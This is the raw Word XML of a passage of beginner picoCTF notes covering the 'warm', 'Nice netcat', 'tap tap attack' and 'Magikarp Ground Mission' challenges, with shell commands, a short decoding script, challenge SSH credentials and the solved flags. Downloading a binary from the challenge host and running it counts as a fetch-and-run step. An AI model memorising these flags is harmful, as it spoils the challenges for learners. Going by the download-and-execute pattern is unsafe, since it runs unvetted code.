    <w:p w14:paraId="4BA98A25" w14:textId="42258AE1" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="354DA09F" w14:textId="7E17C727" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="714029BD" w14:textId="458E1A31" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="778F9E3E" w14:textId="5BB6A58F" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="1EB9F46D" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE2B5C3" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">└─$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> https://mercury.picoctf.net/static/a14be2648c73e3cda5fc8490a2f476af/warm       </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A63F493" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>--2022-08-30 13:17:20--  https://mercury.picoctf.net/static/a14be2648c73e3cda5fc8490a2f476af/warm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27AA731C" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="510ECC7E" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC7D703" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>HTTP request sent, awaiting response... 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709074BD" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>Length: 10936 (11K) [application/octet-stream]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70DB7104" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>Saving to: ‘warm’</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8B981F" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035"/>
    <w:p w14:paraId="5F57A5DE" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">warm                100%[================&gt;]  10.68K  --.-KB/s    in 0s      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40830FDD" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035"/>
    <w:p w14:paraId="7F045F6F" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>2022-08-30 13:17:20 (26.0 MB/s) - ‘warm’ saved [10936/10936]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65CE1078" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035"/>
    <w:p w14:paraId="217062FC" w14:textId="183122A0" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">                                                                                                                                                          </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F922999" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5552BA6F" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>└─$ ./warm -h</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C704DF" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>zsh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AA1035">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>permission denied: ./warm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B12C2F8" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CE6369" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DC87947" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">└─$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>chmod</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> +x warm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE1733C" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021BD97F" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01738D8B" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>└─$ ./warm --help</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400B8A63" w14:textId="4909CE03" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>I don't know what '--help' means</w:t>
      </w:r>
      <w:r w:rsidRPr="00AA1035">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>! I do know what -h means though!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                                                                             </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C8CDE9" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5390243B" w14:textId="77777777" w:rsidR="00AA1035" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t>└─$ ./warm -h</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08FA54AA" w14:textId="5BCADB4D" w:rsidR="00BD5D34" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:r>
        <w:t xml:space="preserve">Oh, help? I actually don't do much, but I do have this flag here: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{b1scu1ts_4nd_gr4vy_755f3544}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4024CE" w14:textId="10D0B2FA" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="24490616" w14:textId="0CCF700B" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="0D0A1397" w14:textId="569E472B" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="111D291F" w14:textId="26BF3E57" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="11C74C4D" w14:textId="25C6DE65" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="594E99EA" w14:textId="37737BF4" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="6467003A" w14:textId="5E80A0F0" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="07AAF84C" w14:textId="45043EAC" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="4EE515C3" w14:textId="4580CC68" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="792E8134" w14:textId="081F966A" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="3EDA10FD" w14:textId="4ECA8164" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="49D2BE1B" w14:textId="34D3F76A" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="42C75CAC" w14:textId="753B110A" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="7609B5AC" w14:textId="6D8B903A" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="1E28EDF2" w14:textId="233D0D8B" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="783D62E9" w14:textId="6608878B" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="7044C5EC" w14:textId="1969D431" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="0BFE0D2F" w14:textId="77777777" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="00F7099E"/>
    <w:p w14:paraId="317ABB88" w14:textId="4C792D04" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="5FC0DFC6" w14:textId="76119AAD" w:rsidR="00BD5D34" w:rsidRDefault="00AA1035" w:rsidP="00AA1035">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Nice </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="009B18D6">
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3D80DE55" w14:textId="38FB29B0" w:rsidR="00BD5D34" w:rsidRDefault="00AA1035" w:rsidP="00F7099E">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="167B1437" wp14:editId="2D65B940">
            <wp:extent cx="6332220" cy="267208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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2672080"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0290078F" w14:textId="77777777" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="009B18D6">
      <w:r>
        <w:t>──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A7EAB73" w14:textId="55A683C7" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="009B18D6">
      <w:r>
        <w:t xml:space="preserve">└─$  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> mercury.picoctf.net 43239 &gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nice</w:t>
      </w:r>
      <w:r w:rsidR="002401ED">
        <w:t>net</w:t>
      </w:r>
      <w:r>
        <w:t>cat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="701A51F7" w14:textId="3CC7676B" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="009B18D6"/>
    <w:p w14:paraId="2C6CD875" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B8DA57" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t xml:space="preserve">└─$ cat nicecat.py     </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9D33A4" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>f= open("</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nicenetcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>","r")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D2F3F8" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>lines =</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>f.readlines</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E63F51" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>result=""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1417F88B" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>for line in lines:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A6B878" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t xml:space="preserve">        result+=chr(int(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>line.strip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>("\n")))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D742EC" w14:textId="74FFDAD6" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>print(result)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6E5E83" w14:textId="312CD2F5" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="009B18D6"/>
    <w:p w14:paraId="1FA5D527" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="009B18D6"/>
    <w:p w14:paraId="51EDB485" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r>
        <w:t>kali)-[~]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273329C2" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:r>
        <w:t>└─$ python nicecat.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75CA897D" w14:textId="70D5D057" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="002401ED">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{g00d_k1tty!_n1c3_k1tty!_7c0821f5}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4F01D4" w14:textId="4E05E287" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="009B18D6"/>
    <w:p w14:paraId="52D03DF1" w14:textId="19E52BC8" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="009B18D6"/>
    <w:p w14:paraId="07CD5A59" w14:textId="77777777" w:rsidR="002401ED" w:rsidRDefault="002401ED" w:rsidP="009B18D6"/>
    <w:p w14:paraId="48BEF36A" w14:textId="77777777" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="009B18D6"/>
    <w:p w14:paraId="13AE13BB" w14:textId="1837B491" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="2C16EB07" w14:textId="77777777" w:rsidR="00BD5D34" w:rsidRDefault="00BD5D34" w:rsidP="00F7099E"/>
    <w:p w14:paraId="0A5D873F" w14:textId="77777777" w:rsidR="00F7099E" w:rsidRDefault="00F7099E" w:rsidP="00F7099E">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24E6205C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="2B742A89" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">2. tap </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>tap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22909DB1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>tap to complete file name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FE5390" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">download the zip file, </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D880FF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>: unzip  filename</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D98DA1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t xml:space="preserve">open directories, till find an executable  file </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601B2EE8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:r>
        <w:t>$ ./fang-of-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>haynekhtnamet</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE356D2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{l3v3l_up!_t4k3_4_r35t!_524e3dc4}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65867647" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="2B193650" w14:textId="77777777" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="009B18D6">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:eastAsia="Times New Roman" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>7.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AA1035">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>Magikarp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ground Mission</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01456FBC" w14:textId="77777777" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="009B18D6">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F0A56CB" wp14:editId="6AB06995">
            <wp:extent cx="6332220" cy="280479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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2804795"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FDC3C83" w14:textId="77777777" w:rsidR="009B18D6" w:rsidRDefault="009B18D6" w:rsidP="009B18D6"/>
    <w:p w14:paraId="72746046" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591"/>
    <w:p w14:paraId="57C2BE4A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">User name : </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ctf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>-player</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650B0269" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Password : 6d448c9c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726854B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> ctf-player@venus.picoctf.net -p 55246</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27866013" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="1" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t>ssh</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t xml:space="preserve">  </w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK "mailto:user@host" \h </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:ins w:id="2" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t>user@host</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> HYPERLINK \h </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:ins w:id="3" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:ins w:id="4" w:author="Unknown Author" w:date="2022-08-26T10:14:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
          <w:t xml:space="preserve"> -port 55246</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="692074EB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:ins w:id="5" w:author="Unknown Author" w:date="2022-08-26T10:16:00Z"/>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="6" w:author="Unknown Author" w:date="2022-08-26T10:13:00Z">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="SourceText"/>
          </w:rPr>
